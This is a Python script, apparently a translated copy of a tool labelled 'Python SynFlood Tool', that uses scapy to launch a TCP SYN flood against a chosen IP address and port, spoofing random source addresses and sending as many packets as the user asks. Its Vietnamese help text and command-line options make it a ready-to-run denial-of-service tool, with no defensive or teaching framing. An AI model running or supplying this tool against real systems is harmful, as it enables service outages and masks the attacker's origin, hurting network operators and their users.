#!/usr/bin/python3

from sys import stdout
from scapy.all import *
from random import randint
from argparse import ArgumentParser


def randomIP():
	ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000, 9000)
	return x


def SYN_Flood(dstIP, dstPort, counter):
	total = 0
	print ("Các gói đang gửi ...")

	for x in range (0, counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()
		TCP_Packet.sport = s_port
		TCP_Packet.dport = int(dstPort)
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		total+=1

	stdout.write("\nTổng số gói đã gửi: %i\n" % total)


def main():
	parser = ArgumentParser()
	parser.add_argument('--target', '-t', help='target IP address')
	parser.add_argument('--port', '-p', help='target port number')
	parser.add_argument('--count', '-c', help='number of packets')
	parser.add_argument('--version', '-v', action='version', version='Python SynFlood Tool v2.0.1\n@EmreOvunc')
	parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1"

	args = parser.parse_args()

	if args.target is not None:
		if args.port is not None:
			if args.count is None:
				print('[!]Bạn đã không sử dụng tham số --counter / -c, vì vậy 1 gói sẽ được gửi ..')
				SYN_Flood(args.target, args.port, 1)

			else:
				SYN_Flood(args.target, args.port, int(args.count))

		else:
			print('[-]Vui lòng sử dụng --port / -p để cung cấp cổng của mục tiêu!')
			print('[!]Ví dụ: -p 445')
			print('[?]-h để được giúp đỡ')
			exit()
	else:
		print('''cách sử dụng: py3_synflood_cmd.py [--help] [--target TARGET] [--port PORT]
                           [--count COUNT] [--version]
đối số tùy chọn:
  --help, -h hiển thị thông báo trợ giúp này và thoát
  --target TARGET, -t TARGET
địa chỉ IP mục tiêu
  --port PORT, -p PORT số cổng mục tiêu
  --count COUNT, -c ĐẾM
số lượng gói tin
  --version, -v hiển thị số phiên bản của chương trình và thoát''')
		exit()
main()
